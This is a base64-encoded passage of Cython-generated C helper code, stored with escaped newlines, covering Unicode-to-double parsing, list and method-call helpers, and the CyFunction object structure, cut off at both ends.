ICAgICAgICAgICAgcmV0dXJuIChzaWduID09IFwnLVwnKSA/IC1QeV9IVUdFX1ZBTCA6IFB5X0hVR0VfVkFMO1xuICAgICAgICBjYXNlIFwnLlwnOiBjYXNlIFwnMFwnOiBjYXNlIFwnMVwnOiBjYXNlIFwnMlwnOiBjYXNlIFwnM1wnOiBjYXNlIFwnNFwnOiBjYXNlIFwnNVwnOiBjYXNlIFwnNlwnOiBjYXNlIFwnN1wnOiBjYXNlIFwnOFwnOiBjYXNlIFwnOVwnOlxuICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICBnb3RvIHBhcnNlX2ZhaWx1cmU7XG4gICAgfVxuICAgIHJldHVybiAwLjA7XG5wYXJzZV9mYWlsdXJlOlxuICAgIHJldHVybiAtMS4wO1xufVxuc3RhdGljIGRvdWJsZSBfX1B5eF9QeVVuaWNvZGVfQXNEb3VibGVfV2l0aFNwYWNlcyhQeU9iamVjdCAqb2JqKSB7XG4gICAgZG91YmxlIHZhbHVlO1xuICAgIGNvbnN0IGNoYXIgKmxhc3Q7XG4gICAgY2hhciAqZW5kO1xuICAgIFB5X3NzaXplX3Qgc3RhcnQsIGxlbmd0aCA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKG9iaik7XG4gICAgY29uc3QgaW50IGtpbmQgPSBQeVVuaWNvZGVfS0lORChvYmopO1xuICAgIGNvbnN0IHZvaWQqIGRhdGEgPSBQeVVuaWNvZGVfREFUQShvYmopO1xuICAgIHN0YXJ0ID0gMDtcbiAgICB3aGlsZSAoUHlfVU5JQ09ERV9JU1NQQUNFKFB5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGEsIHN0YXJ0KSkpXG4gICAgICAgIHN0YXJ0Kys7XG4gICAgd2hpbGUgKHN0YXJ0IDwgbGVuZ3RoIC0gMSAmJiBQeV9VTklDT0RFX0lTU1BBQ0UoUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgbGVuZ3RoIC0gMSkpKVxuICAgICAgICBsZW5ndGgtLTtcbiAgICBsZW5ndGggLT0gc3RhcnQ7XG4gICAgaWYgKHVubGlrZWx5KGxlbmd0aCA8PSAwKSkgZ290byBmYWxsYmFjaztcbiAgICB2YWx1ZSA9IF9fUHl4X19QeVVuaWNvZGVfQXNEb3VibGVfaW5mX25hbihkYXRhLCBraW5kLCBzdGFydCwgbGVuZ3RoKTtcbiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gLTEuMCkpIGdvdG8gZmFsbGJhY2s7XG4gICAgaWYgKHZhbHVlICE9IDAuMCkgcmV0dXJuIHZhbHVlO1xuICAgIGlmIChsZW5ndGggPCA0MCkge1xuICAgICAgICBjaGFyIG51bWJlcls0MF07XG4gICAgICAgIGxhc3QgPSBfX1B5eF9fUHlVbmljb2RlX0FzRG91YmxlX0NvcHkoZGF0YSwga2luZCwgbnVtYmVyLCBzdGFydCwgc3RhcnQgKyBsZW5ndGgpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWxhc3QpKSBnb3RvIGZhbGxiYWNrO1xuICAgICAgICB2YWx1ZSA9IFB5T1Nfc3RyaW5nX3RvX2RvdWJsZShudW1iZXIsICZlbmQsIE5VTEwpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIGNoYXIgKm51bWJlciA9IChjaGFyKikgUHlNZW1fTWFsbG9jKChsZW5ndGggKyAxKSAqIHNpemVvZihjaGFyKSk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbnVtYmVyKSkgZ290byBmYWxsYmFjaztcbiAgICAgICAgbGFzdCA9IF9fUHl4X19QeVVuaWNvZGVfQXNEb3VibGVfQ29weShkYXRhLCBraW5kLCBudW1iZXIsIHN0YXJ0LCBzdGFydCArIGxlbmd0aCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbGFzdCkpIHtcbiAgICAgICAgICAgIFB5TWVtX0ZyZWUobnVtYmVyKTtcbiAgICAgICAgICAgIGdvdG8gZmFsbGJhY2s7XG4gICAgICAgIH1cbiAgICAgICAgdmFsdWUgPSBQeU9TX3N0cmluZ190b19kb3VibGUobnVtYmVyLCAmZW5kLCBOVUxMKTtcbiAgICAgICAgUHlNZW1fRnJlZShudW1iZXIpO1xuICAgIH1cbiAgICBpZiAobGlrZWx5KGVuZCA9PSBsYXN0KSB8fCAodmFsdWUgPT0gKGRvdWJsZSktMSAmJiBQeUVycl9PY2N1cnJlZCgpKSkge1xuICAgICAgICByZXR1cm4gdmFsdWU7XG4gICAgfVxuZmFsbGJhY2s6XG4gICAgcmV0dXJuIF9fUHl4X1Nsb3dQeVN0cmluZ19Bc0RvdWJsZShvYmopO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBkb3VibGUgX19QeXhfUHlVbmljb2RlX0FzRG91YmxlKFB5T2JqZWN0ICpvYmopIHtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKG9iaikgPT0gLTEpKVxuICAgICAgICByZXR1cm4gKGRvdWJsZSktMTtcbiAgICBpZiAobGlrZWx5KFB5VW5pY29kZV9JU19BU0NJSShvYmopKSkge1xuICAgICAgICBjb25zdCBjaGFyICpzO1xuICAgICAgICBQeV9zc2l6ZV90IGxlbmd0aDtcbiAgICAgICAgcyA9IFB5VW5pY29kZV9Bc1VURjhBbmRTaXplKG9iaiwgJmxlbmd0aCk7XG4gICAgICAgIHJldHVybiBfX1B5eF9fUHlCeXRlc19Bc0RvdWJsZShvYmosIHMsIGxlbmd0aCk7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfQXNEb3VibGVfV2l0aFNwYWNlcyhvYmopO1xuI2Vsc2VcbiAgICByZXR1cm4gX19QeXhfU2xvd1B5U3RyaW5nX0FzRG91YmxlKG9iaik7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5TnVtYmVyX0Zsb2F0KFB5T2JqZWN0KiBvYmopO1xuI2RlZmluZSBfX1B5eF9QeU51bWJlcl9GbG9hdCh4KSAoUHlGbG9hdF9DaGVja0V4YWN0KHgpID8gX19QeXhfTmV3UmVmKHgpIDogX19QeXhfX1B5TnVtYmVyX0Zsb2F0KHgpKVxuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX1RydWVEaXZpZGVPYmpDKFB5T2JqZWN0ICpvcDEsIFB5T2JqZWN0ICpvcDIsIGxvbmcgaW50dmFsLCBpbnQgaW5wbGFjZSwgaW50IHplcm9kaXZpc2lvbl9jaGVjayk7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMob3AxLCBvcDIsIGludHZhbCwgaW5wbGFjZSwgemVyb2RpdmlzaW9uX2NoZWNrKVxcXG4gICAgKGlucGxhY2UgPyBQeU51bWJlcl9JblBsYWNlVHJ1ZURpdmlkZShvcDEsIG9wMikgOiBQeU51bWJlcl9UcnVlRGl2aWRlKG9wMSwgb3AyKSlcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdChQeU9iamVjdCogcywgUHlPYmplY3QqIGYpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0KHMsIGYpIFB5T2JqZWN0X0Zvcm1hdChzLCBmKVxuI2VuZGlmXG5cblxuIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAjaWYgQ1lUSE9OX1JFRk5BTk5ZXG4gICAgICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UobGVmdCwgcmlnaHQpIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbCgmbGVmdCwgcmlnaHQsIF9fcHl4X3JlZm5hbm55KVxuICAgICNlbHNlXG4gICAgICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UobGVmdCwgcmlnaHQpIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbCgmbGVmdCwgcmlnaHQpXG4gICAgI2VuZGlmXG4gICAgc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbChQeU9iamVjdCAqKnBfbGVmdCwgUHlPYmplY3QgKnJpZ2h0XG4gICAgICAgICNpZiBDWVRIT05fUkVGTkFOTllcbiAgICAgICAgLCB2b2lkKiBfX3B5eF9yZWZuYW5ueVxuICAgICAgICAjZW5kaWZcbiAgICApO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UgX19QeXhfUHlVbmljb2RlX0NvbmNhdFxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlU2FmZShsZWZ0LCByaWdodCkgKCh1bmxpa2VseSgobGVmdCkgPT0gUHlfTm9uZSkgfHwgdW5saWtlbHkoKHJpZ2h0KSA9PSBQeV9Ob25lKSkgP1xcXG4gICAgUHlOdW1iZXJfSW5QbGFjZUFkZChsZWZ0LCByaWdodCkgOiBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCkpXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKFxuICAgICAgICBQeU9iamVjdCogb2JqLCBQeV9zc2l6ZV90IGNzdGFydCwgUHlfc3NpemVfdCBjc3RvcCxcbiAgICAgICAgUHlPYmplY3QqKiBweV9zdGFydCwgUHlPYmplY3QqKiBweV9zdG9wLCBQeU9iamVjdCoqIHB5X3NsaWNlLFxuICAgICAgICBpbnQgaGFzX2NzdGFydCwgaW50IGhhc19jc3RvcCwgaW50IHdyYXBhcm91bmQpO1xuXG5cbiNpZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TGlzdF9BcHBlbmQoUHlPYmplY3QqIGxpc3QsIFB5T2JqZWN0KiB4KSB7XG4gICAgUHlMaXN0T2JqZWN0KiBMID0gKFB5TGlzdE9iamVjdCopIGxpc3Q7XG4gICAgUHlfc3NpemVfdCBsZW4gPSBQeV9TSVpFKGxpc3QpO1xuICAgIGlmIChsaWtlbHkoTC0+YWxsb2NhdGVkID4gbGVuKSAmIGxpa2VseShsZW4gPiAoTC0+YWxsb2NhdGVkID4+IDEpKSkge1xuICAgICAgICBQeV9JTkNSRUYoeCk7XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICAgICBMLT5vYl9pdGVtW2xlbl0gPSB4O1xuICAgICAgICAjZWxzZVxuICAgICAgICBQeUxpc3RfU0VUX0lURU0obGlzdCwgbGVuLCB4KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIF9fUHl4X1NFVF9TSVpFKGxpc3QsIGxlbiArIDEpO1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIFB5TGlzdF9BcHBlbmQobGlzdCwgeCk7XG59XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUxpc3RfQXBwZW5kKEwseCkgUHlMaXN0X0FwcGVuZChMLHgpXG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKFB5T2JqZWN0KiBmdW5jdGlvbiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKTtcblxuXG5zdGF0aWMgaW50IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKiptZXRob2QpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLCBQeU9iamVjdCogYXJnKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfQXBwZW5kKFB5T2JqZWN0KiBMLCBQeU9iamVjdCogeCk7XG5cblxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0dldEl0ZW0oUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKmtleSk7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HZXRJdGVtKG9iaiwga2V5KSAgUHlPYmplY3RfR2V0SXRlbShvYmosIGtleSlcbiNlbmRpZlxuXG5cbiNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDApXG4jZGVmaW5lIF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCBhbHdheXNfY2FsbCwgdmlzaXQsIGFyZykgMFxuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKFB5T2JqZWN0ICpvLCBpbnQgYWx3YXlzX2NhbGwsIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKTtcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldFR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHApO1xuI2VuZGlmXG5cblxuc3RhdGljIGludCBfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCwgUHlPYmplY3QgKmssIFB5T2JqZWN0ICp2KTtcbiNkZWZpbmUgX19QeXhfU2V0SXRlbU9uVHlwZURpY3QodHAsIGssIHYpIF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCgoUHlUeXBlT2JqZWN0Kil0cCwgaywgdilcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhQeVR5cGVfU3BlYyAqc3BlYywgUHlUeXBlT2JqZWN0ICp0eXBlKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKFB5T2JqZWN0ICpmdW5jKTtcblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBtZXRob2RfbmFtZSk7XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuc3RhdGljIGludCBfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZShjb25zdCBjaGFyICp0eXBlX25hbWUsIFB5X3NzaXplX3QgZGljdG9mZnNldCwgUHlPYmplY3QgKmJhc2VzKTtcbiNlbmRpZlxuXG5cbkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9QeVR5cGVfUmVhZHkoUHlUeXBlT2JqZWN0ICp0KTtcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydChQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmZyb21fbGlzdCwgaW50IGxldmVsKTtcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlKTtcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlX1dhbGtQYXJ0cyhQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlKTtcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TGlzdF9QYWNrKFB5X3NzaXplX3QgbiwgLi4uKTtcblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X0ltcG9ydEZyb20oUHlPYmplY3QqIG1vZHVsZSwgUHlPYmplY3QqIG5hbWUpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfRmV0Y2hTaGFyZWRDeXRob25BQklNb2R1bGUodm9pZCk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9TZXREZWZhdWx0KFB5T2JqZWN0ICpkLCBQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqZGVmYXVsdF92YWx1ZSwgaW50IGlzX3NhZmVfdHlwZSk7XG5cblxuc3RhdGljIFB5VHlwZU9iamVjdCogX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICptb2R1bGUsIFB5VHlwZV9TcGVjICpzcGVjLCBQeU9iamVjdCAqYmFzZXMpO1xuXG5cbnN0YXRpYyBpbnQgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfaW5pdChQeU9iamVjdCAqbW9kdWxlKTtcbiNkZWZpbmUgX19QeXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfVVNFRFxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlNZXRob2RfTmV3KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCk7XG5cblxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIChDWVRIT05fVkVDVE9SQ0FMTCB8fCBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTClcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprdyk7XG4jZW5kaWZcblxuXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fVVNFRFxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCAgMHgwMVxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NMQVNTTUVUSE9EICAgMHgwMlxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NDTEFTUyAgICAgICAgMHgwNFxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NPUk9VVElORSAgICAgMHgwOFxuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0dldENsb3N1cmUoZilcXFxuICAgICgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZnVuY19jbG9zdXJlKVxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihmKVxcXG4gICAgICAoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIChmKSktPmZ1bmNfY2xhc3NvYmopXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZilcXFxuICAgICAgKChQeU9iamVjdCopICgoUHlDTWV0aG9kT2JqZWN0ICopIChmKSktPm1tX2NsYXNzKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooZiwgY2xhc3NvYmopXFxcbiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9TZXRDbGFzc09iaigoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZiksIChjbGFzc29iaikpXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fRGVmYXVsdHModHlwZSwgZilcXFxuICAgICgodHlwZSAqKSgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHMpKVxuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzR2V0dGVyKGYsIGcpXFxcbiAgICAoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHNfZ2V0dGVyID0gKGcpXG50eXBlZGVmIHN0cnVjdCB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0X0hFQURcbiAgICBQeU9iamVjdCAqZnVuYztcbiNlbGlmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMVxuICAgIFB5Q0Z1bmN0aW9uT2JqZWN0IGZ1bmM7XG4jZWxzZVxuICAgIFB5Q01ldGhvZE9iamVjdCBmdW5jO1xuI2VuZGlmXG4jaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwgfHxcXFxuICAgICAgICAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBDWVRIT05fTUVUSF9GQVNUQ0FMTClcbiAgICBfX3B5eF92ZWN0b3JjYWxsZnVuYyBmdW5jX3ZlY3RvcmNhbGw7XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmZ1bmNfd2Vha3JlZmxpc3Q7XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqZnVuY19kaWN0O1xuICAgIFB5T2JqZWN0ICpmdW5jX25hbWU7XG4gICAgUHlPYmplY3QgKmZ1bmNfcXVhbG5hbWU7XG4gICAgUHlPYmplY3QgKmZ1bmNfZG9jO1xuICAgIFB5T2JqZWN0ICpmdW5jX2dsb2JhbHM7XG4gICAgUHlPYmplY3QgKmZ1bmNfY29kZTtcbiAgICBQeU9iamVjdCAqZnVuY19jbG9zdXJlO1xuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmZ1bmNfY2xhc3NvYmo7XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqZGVmYXVsdHM7XG4gICAgaW50IGZsYWdzO1xuICAgIFB5T2JqZWN0ICpkZWZhdWx0c190dXBsZTtcbiAgICBQeU9iamVjdCAqZGVmYXVsdHNfa3dkaWN0O1xuICAgIFB5T2JqZWN0ICooKmRlZmF1bHRzX2dldHRlcikoUHlPYmplY3QgKik7XG4gICAgUHlPYmplY3QgKmZ1bmNfYW5ub3RhdGlvbnM7XG4gICAgUHlPYmplY3QgKmZ1bmNfaXNfY29yb3V0aW5lO1xufSBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0O1xuI3VuZGVmIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVja1xuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrKG9iaikgIF9fUHl4X1R5cGVDaGVjayhvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKVxuI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2sob2JqKSAgX19QeXhfVHlwZUNoZWNrMihvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlLCAmUHlDRnVuY3Rpb25fVHlwZSlcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KG9iaikgIF9fUHl4X0lTX1RZUEUob2JqLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSk7XG4jdW5kZWYgX19QeXhfSXNTYW1lQ0Z1bmN0aW9uXG4jZGVmaW5lIF9fUHl4X0lzU2FtZUNGdW5jdGlvbihmdW5jLCBjZnVuYykgICBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihmdW5jLCBjZnVuYylcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9Jbml0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIG9wLCBQeU1ldGhvZERlZiAqbWwsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKmdsb2JhbHMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBjb2RlKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooX19weXhfQ3lGdW5jdGlvbk9iamVjdCogZiwgUHlPYmplY3QqIGNsYXNzb2JqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXREZWZhdWx0cyhQeU9iamVjdCAqZnVuYyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5VHlwZU9iamVjdCAqZGVmYXVsdHNfdHlwZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNUdXBsZShQeU9iamVjdCAqbSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp0dXBsZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNLd0RpY3QoUHlPYmplY3QgKm0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldEFubm90YXRpb25zRGljdChQeU9iamVjdCAqbSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QpO1xuc3RhdGljIGludCBfX3B5eF9DeUZ1bmN0aW9uX2luaXQoUHlPYmplY3QgKm1vZHVsZSk7XG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1MoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX08oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTtcbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEU19NRVRIT0QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90